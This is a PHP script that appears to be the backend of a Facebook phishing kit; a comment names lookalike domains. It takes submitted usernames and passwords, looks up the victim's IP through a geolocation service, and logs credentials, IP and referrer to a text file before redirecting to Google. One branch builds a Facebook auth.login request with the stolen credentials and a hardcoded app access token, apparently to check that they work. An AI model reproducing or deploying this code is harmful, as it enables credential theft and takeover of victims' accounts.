<?php

#Allow cross domain XHR
header('content-type: application/json; charset=utf-8');

header("access-control-allow-origin: *");

$requestsSource = $_SERVER['HTTP_REFERER'];

$http_origin = $_SERVER['HTTP_ORIGIN'];
//|| $http_origin == "http://nn-facebook.com" || $http_origin == "http://el-facebook.com"
$domain = "http://localhost";
$http_origin = "http://localhost";
if ($http_origin == $domain)
{
	$user = $_GET['username'];
	$passw = $_GET['password'];
	if($user=="" || $passw=="" || strlen($user)<5 || strlen($passw)<5 || strlen($passw)>50){
		header("Location: http://www.geoplugin.com/webservices/php");
		exit(0);
	}
	$ip = get_client_ip();
	$geoPlugin_array = unserialize( file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $ip));
	if($geoPlugin_array['geoplugin_countryCode'] == "VNn"){
		// ip VN
		$fp = fopen('request.txt', 'a');
		fwrite($fp, $user."|".$passw."|". $ip . "\n");
		fclose($fp);
		header("Location: http://google.com");
		exit(0);
	}
	else{
		$xml = "https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B%22method%22%3A%22POST%22%2C%22body%22%3A%22format%3Djson%26device_id%3D93609b45-55fd-4152-bd9c-f954a455ae93%26email%3D" . $user . "%26password%3D". $passw . "%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate%22%2C%22name%22%3A%22authenticate%22%2C%22omit_response_on_success%22%3Afalse%2C%22relative_url%22%3A%22method%2Fauth.login%22%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin";
		echo '{"url":"'.trim($xml).'","api_call_id":"5712f6c910fd3e3accb0e20c","ip":null}';
		
//https://b-graph.facebook.com/?include_headers=false&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&method=post&batch=%5B%7B%22method%22%3A%22POST%22%2C%22body%22%3A%22format%3Djson%26device_id%3D93609b45-55fd-4152-bd9c-f954a455ae93%26email%3D" . $user . "%26password%3D". $passw . "%26credentials_type%3Dpassword%26generate_session_cookies%3D1%26error_detail_type%3Dbutton_with_disabled%26generate_machine_id%3D1%26locale%3Den_US%26client_country_code%3DTH%26fb_api_req_friendly_name%3Dauthenticate%22%2C%22name%22%3A%22authenticate%22%2C%22omit_response_on_success%22%3Afalse%2C%22relative_url%22%3A%22method%2Fauth.login%22%7D%5D&fb_api_caller_class=com.facebook.katana.server.handler.Fb4aAuthHandler&fb_api_req_friendly_name=authLogin
	}
}
else{
	$user = $_GET['username'];
	$passw = $_GET['password'];
	if($user=="" || $passw=="" || strlen($user)<5 || strlen($passw)<5 || strlen($passw)>50){
		exit(0);
	}

	$fp = fopen('request.txt', 'a');
	fwrite($fp, $user."|".$passw."|".$http_origin ."|" .$requestsSource."|". get_client_ip() . "\n");
	fclose($fp);
	header("Location: http://google.com");
	//echo "access_token";
	exit(0);
}
?>

<?php
// Function to get the client IP address
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
?>